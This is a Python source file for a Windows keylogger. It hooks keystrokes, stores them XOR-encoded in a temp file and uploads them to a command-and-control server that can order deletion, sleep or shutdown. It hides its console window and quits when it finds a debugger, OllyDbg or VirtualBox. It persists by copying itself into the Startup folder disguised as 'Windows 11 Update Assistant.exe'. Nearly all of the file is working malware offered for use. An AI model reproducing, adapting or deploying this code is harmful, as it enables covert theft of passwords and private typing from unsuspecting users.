# Keylogger for Windows
# Vaibhav Ekambaram

# Libraries to Import
import hashlib
import os
import platform
import random
import shutil
import string
import time
import uuid
import pyWinhook
import pythoncom
import requests
import win32console
import win32gui
# REQUIRED FOR ANTI VIRTUAL MACHINE DETECTION
import psutil

from os import path
from os.path import expanduser
from sys import exit
from threading import Thread, Event
from ctypes import *

# flag to stop timer threading event
stopFlag = Event()
# user agent to spoof
# user agent header

# count number of requests made
request_counter = 0

proxies = {
    # Note: http proxying requires a server to function
    "http": "http://192.168.1.8:3128"
}


# thread for running beacon timer
class BeaconThread(Thread):
    def __init__(self, event):
        Thread.__init__(self)
        self.stopped = event

    # send beacon message every 10 seconds. This is done on a different thread to avoid concurrency issues
    def run(self):
        while not self.stopped.wait(1):
            send_beacon_message()
            time.sleep(10)

    # stop thread
    def _stop(self):
        pass


# encrypt with xor
def encrypt(input_string):
    length = len(input_string)
    # encryption key = 'E'
    encryption_key = chr(59 + 10)

    # perform xor encoding
    for i in range(length):
        input_string = (input_string[:i] + chr(ord(input_string[i]) ^ ord(encryption_key)) + input_string[i + 1:])

    # return encoded string converted to hex
    return input_string.encode('utf-8').hex()


# decrypt with xor
def decrypt(input_string):
    # convert input string back from hex back to a string
    input_string = bytes.fromhex(input_string).decode('utf-8')

    length = len(input_string)

    # encryption key = 'E'
    encryption_key = chr(59 + 10)

    # perform xor decoding
    for i in range(length):
        input_string = (input_string[:i] + chr(ord(input_string[i]) ^ ord(encryption_key)) + input_string[i + 1:])

    return input_string


# iterate request counter
def iterate_counter():
    global request_counter
    request_counter += 1


# get request counter
def get_counter():
    return request_counter


# reset request counter
def reset_counter():
    global request_counter
    request_counter = 0


# delete local logging file
def delete():
    filepath = encrypt('~/AppData/Local/Temp')
    if os.path.exists(os.path.join(path.expanduser(decrypt(filepath)), key_log_file)):
        os.remove(os.path.expanduser(os.path.join(path.expanduser(decrypt(filepath)), key_log_file)))


# send a beacon message
def send_beacon_message():
    # generate a random string to vary both the request length, and act as a security key
    string_length = random.randint(32, 64)
    token = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=string_length))

    payload = bytes(encrypt(uuid_string + " " + token), 'utf-8')
    try:
        # send beacon request with uuid to C2
        r_h = {
            'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 "
                          "Safari/537.36 "}
        r = requests.put(decrypt(remote_server), data=payload, headers=r_h, proxies=proxies)
    except:
        return

    # check that response contains randomly generated security key from earlier
    split_text = decrypt(r.text).split()
    if not split_text[len(split_text) - 1] == token:
        return

    # if connected response
    if "Connected" in decrypt(r.text):
        # if the logging path doesnt exist then create it again

        f_path = encrypt('~/AppData/Local/Temp')
        if os.path.exists(os.path.join(path.expanduser(decrypt(f_path)), key_log_file)):
            text_file_to_upload = open(
                os.path.expanduser(os.path.join(path.expanduser(decrypt(f_path)), key_log_file)), "r")
            text_file_data = text_file_to_upload.read()
            text_file_to_upload.close()

            # upload file on counter condition
            if get_counter() == 0:
                # create another new security token
                string_length = random.randint(32, 64)
                token = ''.join(
                    random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=string_length))
                # upload uuid, logged data and security token
                upload_string = uuid_string + " " + decrypt(text_file_data)
                payload2 = bytes(encrypt(upload_string) + " " + token, 'utf-8')
                try:
                    # send upload request
                    header = {
                        'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 "
                                      "Safari/537.36 "}
                    r2 = requests.post(decrypt(remote_server) + "POST", data=payload2, headers=header, proxies=proxies)
                except:
                    return
                # increase counter count
                iterate_counter()

                # if successful response has been received after deletion request has been made then delete the file
                if "Success" in decrypt(r2.text):
                    if decrypt(r2.text).split()[1] == token:
                        delete()

            # reset counter
            elif get_counter() >= 2:
                reset_counter()
            else:
                iterate_counter()

    # deletion command
    if "Delete" in decrypt(r.text):
        delete_message = str.split(decrypt(r.text))
        if len(delete_message) == 3:
            if delete_message[1] == uuid_string:
                # delete the locally logged file
                delete()

    # sleep command
    if "Sleep" in decrypt(r.text):
        split_sleep_string = decrypt(r.text).split()

        if len(split_sleep_string) == 4:
            if split_sleep_string[1] == uuid_string:
                if len(split_sleep_string[2]) >= 1:
                    # disconnect keyboard event
                    hm.KeyDown = None
                    # wait the amount of time specified in the query
                    time.sleep(float(split_sleep_string[2]))
                    # connect the keyboard event back
                    hm.KeyDown = on_keyboard_event

    # shutdown command
    if "Shutdown" in decrypt(r.text):
        shutdown_message = str.split(decrypt(r.text))

        if len(shutdown_message) == 3:
            if shutdown_message[1] == uuid_string:
                # stop timer threading
                stopFlag.set()
                # disconnect keyboard event
                hm.KeyDown = None
                # delete attached logging file
                delete()
                # force exit application to jump out of captive thread
                os._exit(0)


# keyboard press event
def on_keyboard_event(event):
    if event.Ascii == 5:
        exit(1)

    log_file_path = encrypt('~/AppData/Local/Temp')
    # create logging file if it does not exist
    if not os.path.exists(os.path.join(path.expanduser(decrypt(log_file_path)), key_log_file)):
        with open(os.path.expanduser(os.path.join(path.expanduser(decrypt(log_file_path)), key_log_file)), "w"): pass

    # open output.txt to read current keystrokes
    f = open(os.path.expanduser(os.path.join(path.expanduser(decrypt(log_file_path)), key_log_file)), "r+")
    buffer = f.read()
    f.close()
    # open output.txt to write current + new keystrokes
    f = open(os.path.expanduser(os.path.join(path.expanduser(decrypt(log_file_path)), key_log_file)), "w")

    ascii_value = event.Ascii
    value_to_write = chr(ascii_value)
    key_logs = value_to_write
    event_key_id = event.KeyID

    # overwrite the values for special keys, and surround them with brackets for improved clarity
    if (8 <= event_key_id <= 9) or event_key_id == 13 or (19 <= event_key_id <= 20) or event_key_id == 27 or \
            (33 <= event_key_id <= 40) or (44 <= event_key_id <= 46) or (112 <= event_key_id <= 123) or \
            event_key_id == 144 or event_key_id == 145:
        key_logs = "[" + event.Key + "]"

    # overwrite the value for ascii null values as this upsets the xor encoding/decoding process
    if event.Ascii == 0:
        key_logs = "[" + event.Key + "]"

    # write to buffer using xor encoding
    buffer += encrypt(key_logs)
    f.write(buffer)
    f.close()
    return True

# dont show console window
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

# ENABLE TO DISABLE DEBUGGING

# Check for both a local and a remote debugger
# https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent
# https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent
is_debugger_present = windll.kernel32.IsDebuggerPresent()
is_remote_debugger_present = windll.kernel32.CheckRemoteDebuggerPresent()

# Exit if debugging through the Win32 API has been detected
if is_debugger_present or is_remote_debugger_present:
    exit(0)

# ENABLE TO DISABLE EXECUTION ON VIRTUAL MACHINES
# Exit if either the Ollydbg debugger has been seen running, or the VirtualBox guest additions are running
running_processes = (str(list([p.name() for p in psutil.process_iter()])))
if 'OLLYDBG.exe' in running_processes or 'VBoxService.exe' in running_processes or 'VBoxTray.exe' in running_processes:
    exit(0)

# ENABLE TO DISABLE EXECUTION ON VIRTUAL MACHINES
# If none of the above processes were not found, then terminate if the guest additions service is found
running_services = str(list(psutil.win_service_iter()))
if 'VirtualBox Guest Additions Service' in running_services:
    exit(0)

# generate uuid
seed = str(platform.uname())
m = hashlib.md5()
m.update(seed.encode('utf-8'))
uuid_string = str(uuid.UUID(m.hexdigest()))

# copy the application to the Windows startup folder to enable persistence
# this folder is ideal as it is not indexed by the file explorer or search
file_name = encrypt(bytes.fromhex('57696e646f77732031312055706461746520417373697374616e742e657865').decode('utf-8'))
file_path = encrypt(
    expanduser("~") + r'\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Windows 11 Update Assistant.exe')

if os.path.exists(os.path.join(path.expanduser(os.getcwd()), decrypt(file_name))):
    target = os.path.join(path.expanduser(os.getcwd()), decrypt(file_name))
    if not os.path.exists(decrypt(file_path)):
        shutil.copyfile(target, decrypt(file_path))

key_log_file = str(uuid.uuid4().hex) + ".tmp"

remote_server = encrypt(bytes.fromhex('687474703a2f2f').decode('utf-8') + "192.168.1.3:5000/")
send_beacon_message()
thread = BeaconThread(stopFlag)
thread.start()
# this will stop the timer
# stopFlag.set()

# create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = on_keyboard_event
# set the hook
hm.HookKeyboard()
# wait forever
pythoncom.PumpMessages()
